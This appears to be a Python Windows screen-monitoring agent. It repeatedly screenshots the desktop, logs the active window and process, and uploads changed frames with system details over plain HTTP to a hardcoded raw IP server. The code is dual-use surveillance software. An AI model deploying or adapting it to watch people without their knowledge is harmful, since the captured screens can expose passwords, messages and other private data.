import io
import os
import platform
import random
import socket
import time
import traceback
from collections import deque
from datetime import datetime
from pathlib import Path

import cv2
import numpy as np
import psutil
import requests
import win32gui
import win32process
from PIL import ImageGrab

SERVER_URL = "http://88.222.221.40:5050/upload"
PC_NAME = socket.gethostname()
INTERVAL_RANGE = (1.0, 1.5)
JPEG_QUALITY = 38
DIFF_THRESHOLD = 5.0
BUFFER_SIZE = 60
REQUEST_TIMEOUT = 10
MAX_RETRIES = 3
VIDEO_ROOT = Path("videos")
VIDEO_FPS = 1


def take_screenshot():
    try:
        return ImageGrab.grab()
    except Exception:
        print("Screenshot capture failed:", traceback.format_exc())
        return None


def image_to_numpy(image):
    return np.array(image.convert("RGB"), dtype=np.uint8)


def has_significant_change(current_frame, previous_frame, threshold):
    if previous_frame is None:
        return True

    if current_frame.shape != previous_frame.shape:
        return True

    diff = np.abs(current_frame.astype(np.int16) - previous_frame.astype(np.int16))
    return float(diff.mean()) >= threshold


def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        if hwnd == 0:
            return "", ""

        title = win32gui.GetWindowText(hwnd) or ""
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process_name = "UNKNOWN"

        try:
            process_name = psutil.Process(pid).name()
        except Exception:
            pass

        return title, process_name
    except Exception:
        return "", ""


def get_pc_info():
    os_name = platform.system() or "Windows"
    os_version = platform.version() or platform.release() or ""

    return {
        "cpu_usage": f"{psutil.cpu_percent(interval=None):.1f}",
        "ram_usage": f"{psutil.virtual_memory().percent:.1f}",
        "os_name": os_name,
        "os_version": os_version,
    }


def encode_jpeg_bytes(image, quality):
    buf = io.BytesIO()
    image.save(buf, format="JPEG", quality=quality, optimize=True)
    return buf.getvalue()


def post_with_retry(url, data, jpeg_bytes, retries, timeout):
    for attempt in range(1, retries + 1):
        try:
            files = {"screenshot": ("screen.jpg", io.BytesIO(jpeg_bytes), "image/jpeg")}
            response = requests.post(url, data=data, files=files, timeout=timeout)
            response.raise_for_status()
            return True
        except requests.RequestException as exc:
            print(f"Upload failed ({attempt}/{retries}): {exc}")
            if attempt < retries:
                time.sleep(0.5 * attempt)
    return False


def ensure_video_dir(pc_name):
    path = VIDEO_ROOT / pc_name
    path.mkdir(parents=True, exist_ok=True)
    return path


def write_latest_video(frames, pc_name):
    if not frames:
        return

    video_dir = ensure_video_dir(pc_name)
    latest_path = video_dir / "latest.mp4"
    temp_path = video_dir / "latest.tmp.mp4"

    for old_file in video_dir.glob("*.mp4"):
        try:
            old_file.unlink()
        except OSError:
            pass

    first = frames[0]
    height, width = first.shape[:2]
    writer = cv2.VideoWriter(
        str(temp_path),
        cv2.VideoWriter_fourcc(*"mp4v"),
        VIDEO_FPS,
        (width, height),
    )

    if not writer.isOpened():
        print("Video writer initialization failed.")
        return

    try:
        for frame in frames:
            writer.write(cv2.cvtColor(frame, cv2.COLOR_RGB2BGR))
    finally:
        writer.release()

    try:
        temp_path.replace(latest_path)
    except OSError:
        pass


def build_payload(active_window, active_process):
    payload = {
        "pc_name": PC_NAME,
        "active_window": active_window,
        "active_process": active_process,
    }
    payload.update(get_pc_info())
    return payload


def main():
    print(f"Monitoring agent started: {PC_NAME}")

    previous_frame = None
    frame_buffer = deque(maxlen=BUFFER_SIZE)

    while True:
        screenshot = take_screenshot()
        if screenshot is not None:
            frame = image_to_numpy(screenshot)
            frame_buffer.append(frame)

            if len(frame_buffer) == BUFFER_SIZE:
                write_latest_video(list(frame_buffer), PC_NAME)

            if has_significant_change(frame, previous_frame, DIFF_THRESHOLD):
                previous_frame = frame
                image_bytes = encode_jpeg_bytes(screenshot, JPEG_QUALITY)
                active_window, active_process = get_active_window_info()
                payload = build_payload(active_window, active_process)
                ok = post_with_retry(
                    SERVER_URL,
                    payload,
                    image_bytes,
                    retries=MAX_RETRIES,
                    timeout=REQUEST_TIMEOUT,
                )
                if ok:
                    print("[OK] uploaded")
            else:
                print("[SKIP] no significant change")

        time.sleep(random.uniform(*INTERVAL_RANGE))


if __name__ == "__main__":
    main()
